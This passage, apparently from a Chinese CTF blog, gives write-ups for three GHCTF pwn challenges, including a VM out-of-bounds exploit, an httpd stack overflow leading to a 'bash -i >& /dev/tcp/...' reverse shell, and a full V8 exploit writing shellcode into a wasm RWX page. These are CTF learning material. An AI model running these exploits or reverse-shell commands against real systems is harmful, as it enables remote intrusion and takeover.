class="line">ip=0x100</span><br></pre></td></tr></table></figure><ul><li>之后我们要构造负索引，这时我们就用<code>0x50</code>，<code>sub</code>指令，使<code>r4-r0</code>，这时我们就得到了负值。</li><li><p>最后我们再通过<code>0x90</code>存指令，直接就可以实现越界读写，使得<code>函数指针指向backdoor</code></p></li><li><p>至于负索引要索引到多少，就需要动调去计算偏移了。</p></li></ul><h2 id="my_vm_exp"><a href="#my-vm-exp" class="headerlink" title="my_vm_exp"></a>my_vm_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28151</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./my_vm&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,r1,r2,r3=<span class="number">0</span></span>):</span><br><span class="line">    a = (op &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">24</span></span><br><span class="line">    a +=(r1 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    a +=(r2 &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span></span><br><span class="line">    a +=(r3 &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(a))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(a).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置PC=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;IP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置SP=0x0</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;SP:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment"># 设置Code_size=0x1000</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;execve:&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x8</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;break *0x400CFB&#x27;)</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">20</span>)</span><br><span class="line">code(<span class="number">0x80</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>) <span class="comment"># r1 = 0x400000</span></span><br><span class="line">code(<span class="number">0x10</span>,<span class="number">3</span>,<span class="number">0x08</span>,<span class="number">0x77</span>)</span><br><span class="line">code(<span class="number">0x40</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line">code(<span class="number">0x50</span>,<span class="number">4</span>,<span class="number">4</span>,<span class="number">0</span>)</span><br><span class="line">code(<span class="number">0x90</span>,<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="fruit_ninja"><a href="#fruit-ninja" class="headerlink" title="fruit_ninja"></a>fruit_ninja</h1><ul><li><p>还没写完，先看看这篇博客</p></li><li><p><a href="https://iyheart.github.io/2024/09/25/CTFblog/PWN系列blog/WEB_pwn/web-pwn之httpd/?highlight=httpd">web-pwn之httpd | iyheart的博客</a></p></li></ul><h2 id="前置知识"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><ul><li>需要理解<code>Linux</code>系统编程中的<code>创建线程函数</code>：参考这篇博客：<a href="https://iyheart.github.io/2025/02/24/编程语言系列blog/Linux系统编程/Linux系统编程1/">Linux系统编程1 | iyheart的博客</a></li><li>需要理解<code>Linux</code>网络编程中的一些函数：这里直接问<code>AI</code>吧</li><li>需要了解一下<code>Http</code>协议。<a href="https://www.runoob.com/http/http-messages.html">HTTP 消息结构 | 菜鸟教程</a>、<a href="https://www.runoob.com/http/http-methods.html">HTTP 请求方法 | 菜鸟教程</a></li><li>注意：<strong>请求方法这边只要看<code>get</code>方法和<code>Post</code>方法即可</strong></li><li>反弹shell</li><li>这里也简单介绍一下相关知识吧。</li></ul><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><ul><li>什么是反弹shell，一般pwn都是我们攻击者去连接目标主机，而反弹shell是目标主机主动去连接攻击者的主机，并将执行权限给攻击者</li><li>反弹shell的前提：需要一个具有公网ip的服务器（IPv4）</li><li>在一般的情况下，pwn了目标主机，直接就<code>getshell</code>了，这时我们就可以直接<code>cat flag</code>目标主机就会将flag的内容发送给我们，但是在需要反弹shell的情况，当我们getshell之后，我们可以对目标主机执行命令，但是接收不到目标执行完命令后的内容。这就导致我们无法得到flag的内容，这时就是要反弹shell</li><li>反弹shell有几个办法，我们就先介绍一个办法吧：<ul><li>需要一个具有公网ip的服务器，假设其ip为<code>1.1.1.1</code>。</li><li>我们先指定开放该服务器的端口<code>2333</code>，输入指令为<code>nc -lvp 2333</code>或<code>nc -n -lvp 2333</code></li><li>然后我们getshell了目标靶机，这时我们就执行命令<code>bash -i &gt;&amp; /dev/tcp/1.1.1.1/2333 0&gt;&amp;1</code></li><li>这样目标靶机就连接上了我们的服务器，并且在我们服务器这边具有执行目标靶机目录的权限，也可以看到执行后的结果，这时我们就可以得到flag</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925182507092.png" alt="image-20240925182507092"></p><h2 id="fruitninja分析"><a href="#fruitninja分析" class="headerlink" title="fruitninja分析"></a>fruit<em>ninja</em>分析</h2><ul><li>题目来源：<a href="https://www.nssctf.cn/problem/5143">[GHCTF 2024 新生赛]Fruit Ninja | NSSCTF</a></li><li>题目附件：<a href="https://wwsq.lanzoue.com/inbAS2atudaf">https://wwsq.lanzoue.com/inbAS2atudaf</a> 密码:ffor</li><li>拿到附件先看看附件内容，发现文件<code>httpd</code>是一个二进制文件</li><li>然后<code>www</code>目录下的是web页面相关的前后端</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162120040.png" alt="image-20240925162120040"></p><ul><li>查看一下保护，发现保护全开</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162036762.png" alt="image-20240925162036762"></p><ul><li>接下来我们反编译一下该程序，先查看<code>main</code>函数，我们先理清楚一下<code>main</code>函数的执行过程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">程序先从main函数开始</span><br><span class="line">---&gt;调用startup函数，启动服务器(用于初始化网络服务或客户端)</span><br><span class="line">---&gt;调用accept函数,用来接受一个连接请求(这里会接收一些http协议的内容)</span><br><span class="line">---&gt;pthread_create()这个函数其实是创建一个线程的函数,这时会在<span class="keyword">if</span>语句中调用这个函数</span><br><span class="line"><span class="comment"># 创建一个线程后，这个线程会执行第三个参数所指向的函数(这个参数其实是一个函数指针类型)</span></span><br><span class="line">---&gt;调用accept_request,将处理接受到的http协议的内容</span><br><span class="line"></span><br><span class="line"><span class="comment"># 具体来分析accept_request这个函数</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20240925162422115.png" alt="image-20240925162422115"></p><ul><li>然后我们主要是仔细分析一下<code>accept_request</code>这个函数，这个函数首先会传递一个参数过来，这个参数是文件描述符，这个文件描述符就是用于处理<code>服务器</code>和<code>客户端</code>交互的。</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310194858857.png" alt="image-20250310194858857"></p><ul><li>这里我们先了解一下<code>HTTP</code>请求报文使用<code>GET</code>方法和<code>POST</code>方法大概的模版。<ul><li>我们可以看到<code>GET</code>方法传递的参数就跟在它后面即<code>/1.php</code></li><li>而<code>POST</code>方法传递的参数是在最后那一行，并且比起<code>GET</code>方法<code>POST</code>方法还多了两行<code>Content-Length</code>、<code>Content-Type</code></li><li>而<code>Content-Length</code>后面跟的数字表明我们最后一行传递的参数一共有多少个字节</li></ul></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 这是GET方法的http报文</span><br><span class="line">GET /1.php HTTP/1.1/\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>developer.mozilla.org\r\n</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>fr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 下面是POST方法的http报文</span><br><span class="line">POST /contact_form.php HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>developer.mozilla.org\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>64\r\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded\r\n</span><br><span class="line"></span><br><span class="line">name=Joe%20User&amp;request=Send%20me%20one%20of%20your%20catalogue</span><br></pre></td></tr></table></figure><ul><li>接下来我们分析一下<code>accept_request</code>函数，这个函数先会接收第一行<code>http</code>请求报文，然后判断是不是<code>GET</code>或者<code>POST</code>方法，如果是<code>GET</code>或者<code>POST</code>方法就继续处理数据。</li><li>如果是<code>GET</code>方法，就会获取相应的<code>web</code>目录</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310201446921.png" alt="image-20250310201446921"></p><ul><li>该协议会先处理<code>GET、POST</code>参数，参数正确则会将一下web页面等从服务器发送到客户端中<ul><li>这里在发送<code>web</code>页面之前还会检查我们请求路径的合法性，<code>s</code>这个字符串数组保存的就是<code>web</code>页面的路径</li><li>经过一些列检查后，如果检查都过了就会执行<code>execute_cgi(a1,s,s1,j)</code>这个函数，我们介绍一下这个函数传递的参数</li><li><code>a1</code>：是代表客户端的远程描述符，用于服务器与客户端交互</li><li><code>s</code>：服务器<code>web</code>页面的路径</li><li><code>s1</code>：接收的请求头（即<code>http</code>报文第一行）</li><li><code>j</code>：接收的参数个数</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310201844648.png" alt="image-20250310201844648"></p><ul><li>这里注意：如果请求的路径不合法这里就会发送<code>HTTP</code>响应报文比如<code>HTTP/1.0 404 NOT FOUND</code></li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.0</span> <span class="number">404</span> NOT FOUND\r\n</span><br><span class="line"><span class="attribute">Server</span><span class="punctuation">: </span>jdbhttpd/0.1.0\r\n</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html\r\n</span><br><span class="line">&lt;HTML&gt;&lt;TITLE&gt;Not Found&lt;/TITLE&gt;\r\n</span><br><span class="line">&lt;BODY&gt;&lt;P&gt;The server could not fulfill\r\n</span><br><span class="line">your request because the resource specified\r\n</span><br><span class="line">is unavailable or nonexistent.\r\n</span><br><span class="line">&lt;/BODY&gt;&lt;/HTML&gt;\r\n</span><br></pre></td></tr></table></figure><ul><li>接下来我们查看一下函数<code>execute_cgi</code>具体的执行流程，我们先查看一下这个函数的局部变量</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310202510502.png" alt="image-20250310202510502"></p><ul><li>然后我们再查看一下函数具体执行逻辑，我们先会将<code>文件路径</code>复制给<code>dest</code></li><li>这个函数会根据<code>GET</code>或者<code>POST</code>方法选择处理报文的方式，这里我们重点就来看<code>POST</code>方法<ul><li>如果是<code>POST</code>方法就会接收并处理<code>Content-Length</code>、<code>Authorization: Basic</code></li><li>并且会调用<code>GdecBase64</code>函数对<code>Authorization: Basic</code>后面紧跟着的内容进行<code>Base64</code>解码，将解码后的结果存储在<code>V18</code>这里</li><li><strong>注意在这里就会有一个栈溢出的漏洞了</strong></li><li>之后会对<code>v18</code>的开头进行检查，检查是否为<code>pwner</code>，如果<code>v18</code>的开头不是<code>pwner</code>程序就会出问题</li></ul></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310202804379.png" alt="image-20250310202804379"></p><ul><li>我们会将<code>Base64</code>解码之前的数据存放在<code>v21</code>这边，然后解码之后会存放在<code>v18</code>这边，但是<code>v21</code>这边存储的字节比<code>v18</code>这边多很多，所以这边我们就可以通过溢出，有机会溢出到<code>dest</code>这个数组</li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310203748471.png" alt="image-20250310203748471"></p><ul><li>之后我们再看一下之后的程序逻辑，检查完<code>pwner</code>后，正常情况下程序都会执行到<code>execl()</code>这边，而这里就相当于<code>execve</code>，只不过只不过这个时候我们远程交互用的文件描述符是<code>4</code>，而不是标准输出流。所以命令执行的结果并不会显示到我们的平面中，这时我们<code>getshell</code>之后就需要反弹<code>shell</code></li></ul><p><img src="/2025/03/09/CTFblog/write%20up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/GHCTF2025-PWN%E6%96%B9%E5%90%91wp/image-20250310204023120.png" alt="image-20250310204023120"></p><ul><li>所以思路就是通过<code>Authorization: Basic</code>后面跟着的内容去构造栈溢出，并且使用<code>\x00</code>绕过<code>strcmp(v18, &quot;pwner&quot;)</code>这个检查</li><li>之后我们就可以<code>getshell</code>，<code>getshell</code>后就可以反弹shell了。这个构造栈溢出的偏移量自己手动算算就出来了。</li></ul><h2 id="fruit_ninja_exp"><a href="#fruit-ninja-exp" class="headerlink" title="fruit_ninja_exp"></a>fruit_ninja_exp</h2><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>, <span class="number">24279</span>)</span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;pwner\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">250</span> +<span class="string">&#x27;/bin/bash\x00&#x27;</span></span><br><span class="line">s = b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))</span><br><span class="line">body = <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/2333 0&gt;&amp;1\n\r&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;POST /rule.cgi\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;Content-Length: &#123;&#125;\r\n&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(body))</span><br><span class="line">payload += <span class="string">&#x27;Authorization: Basic &#x27;</span>+ s +<span class="string">&#x27;\r\n\n&#x27;</span></span><br><span class="line">payload += body</span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="my_v8"><a href="#my-v8" class="headerlink" title="my_v8"></a>my_v8</h1><ul><li><code>my_v8</code>这题要写的内容太多了，就先挖个坑吧，来日方长，慢慢填。</li></ul><h2 id="my_v8_exp"><a href="#my-v8-exp" class="headerlink" title="my_v8_exp"></a>my_v8_exp</h2><ul><li>这里就先附上<code>exp</code>：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">// ××××××××<span class="number">1.</span> 无符号<span class="number">64</span>位整数和<span class="number">64</span>位浮点数的转换代码×××××××</span><br><span class="line">var buf =new ArrayBuffer(<span class="number">16</span>);</span><br><span class="line">var float64 = new Float64Array(buf);</span><br><span class="line">var bigUint64 = new BigUint64Array(buf);</span><br><span class="line">// 浮点数转换为<span class="number">64</span>位无符号整数</span><br><span class="line">function f2i(f)</span><br><span class="line">&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">// <span class="number">64</span>位无符号整数转为浮点数</span><br><span class="line">function i2f(i)</span><br><span class="line">&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line">// <span class="number">64</span>位无符号整数转为<span class="number">16</span>进制字节串</span><br><span class="line">function <span class="built_in">hex</span>(i)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">// ××××××××<span class="number">2.</span> addressOf和fakeObject的实现××××××××</span><br><span class="line">var obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line">var obj_array = [obj];</span><br><span class="line">var float_array = [<span class="number">1.1</span>];</span><br><span class="line">var obj_array_map = obj_array.Myread();</span><br><span class="line">var float_array_map = float_array.Myread();</span><br><span class="line">// 泄露某个<span class="built_in">object</span>的地址</span><br><span class="line">function addressOf(obj_to_leak)</span><br><span class="line">&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.Mywrite(float_array_map);</span><br><span class="line">    let obj_addr = f2i(obj_array[<span class="number">0</span>]) - 1n;</span><br><span class="line">    obj_array.Mywrite(obj_array_map); // 还原array类型，以便后续继续使用</span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line">// 将某个addr强制转换为<span class="built_in">object</span>对象</span><br><span class="line">function fakeObject(addr_to_fake)</span><br><span class="line">&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + 1n);</span><br><span class="line">    float_array.Mywrite(obj_array_map);</span><br><span class="line">    let faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.Mywrite(float_array_map); // 还原array类型，以便后续继续使用</span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line">var fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(0n),</span><br><span class="line">    i2f(0x41414141n),</span><br><span class="line">    i2f(0x1000000000n),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line">var fake_array_addr = addressOf(fake_array);</span><br><span class="line">var fake_object_addr = fake_array_addr - 0x40n + 0x10n;</span><br><span class="line">var fake_object = fakeObject(fake_object_addr);</span><br><span class="line">function read64(addr)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - 0x10n + 0x1n);</span><br><span class="line">    let leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    console.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +<span class="built_in">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="built_in">hex</span>(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line">function write64(addr, data)</span><br><span class="line">&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - 0x10n + 0x1n);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    console.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +<span class="built_in">hex</span>(addr) + <span class="string">&quot;: 0x&quot;</span> + <span class="built_in">hex</span>(data));    </span><br><span class="line">&#125;</span><br><span class="line">var wasmCode = new Uint8Array([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">var f = wasmInstance.exports.main;</span><br><span class="line">var f_addr = addressOf(f);</span><br><span class="line">console.log(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + <span class="built_in">hex</span>(f_addr));</span><br><span class="line">var shared_info_addr = read64(f_addr + 0x18n) - 0x1n;</span><br><span class="line">var wasm_exported_func_data_addr = read64(shared_info_addr + 0x8n) - 0x1n;</span><br><span class="line">var wasm_instance_addr = read64(wasm_exported_func_data_addr + 0x10n) - 0x1n;</span><br><span class="line">var rwx_page_addr = read64(wasm_instance_addr + 0x88n);</span><br><span class="line">console.log(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="built_in">hex</span>(rwx_page_addr));</span><br><span class="line">var shellcode = [</span><br><span class="line">    0x2fbb485299583b6an,</span><br><span class="line">    0x5368732f6e69622fn,</span><br><span class="line">    0x050f5e5457525f54n</span><br><span class="line">];</span><br><span class="line">var data_buf = new ArrayBuffer(<span class="number">24</span>);</span><br><span class="line">var data_view = new DataView(data_buf);</span><br><span class="line">var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</span><br><span class="line">write64(buf_backing_store_addr, rwx_page_addr);</span><br><span class="line">data_view.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), true);</span><br><span class="line">data_view.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), true);</span><br><span class="line">data_view.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), true);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：官方wp来了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="write-up" scheme="http://iyheart.github.io/categories/CTF/write-up/"/>
    
    
  </entry>
  
  <entry>
    <title>流量分析基础</title>
    <link href="http://iyheart.github.io/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    <id>http://iyheart.github.io/2025/03/05/%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E4%B8%8E%E6%BA%AF%E6%BA%90%E5%8F%96%E8%AF%81/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2025-03-05T11:33:50.000Z</published>
    <updated>2025-03-26T14:37:16.442Z</updated>
    
